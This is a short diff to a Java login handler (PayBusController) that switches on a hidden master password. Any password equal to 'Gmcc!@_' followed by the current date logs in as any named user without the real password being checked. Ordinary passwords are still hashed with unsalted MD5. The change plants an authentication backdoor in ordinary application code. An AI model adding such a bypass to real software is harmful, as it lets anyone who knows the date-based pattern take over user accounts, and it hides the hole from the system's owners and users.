@@ -164,12 +164,12 @@ public class PayBusController  {
 		SysUser user = null;
 		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");
 		if(pwd.equals("Gmcc!@_"+format.format(new Date()))){
-			//user = sysuserService.queryByUseracc(acc);
+			user = sysuserService.queryByUseracc(acc);
 		}else{
-
+			pwd= SecurityClass.encryptMD5(pwd);
+			user = sysuserService.queryByUserAndPwd(acc,pwd);
 		}
-		pwd= SecurityClass.encryptMD5(pwd);
-		user = sysuserService.queryByUserAndPwd(acc,pwd);
+
 
 		if(user==null || user.getState()!=1){
 			ret.setMsg("用户名或密码错误，请重试");
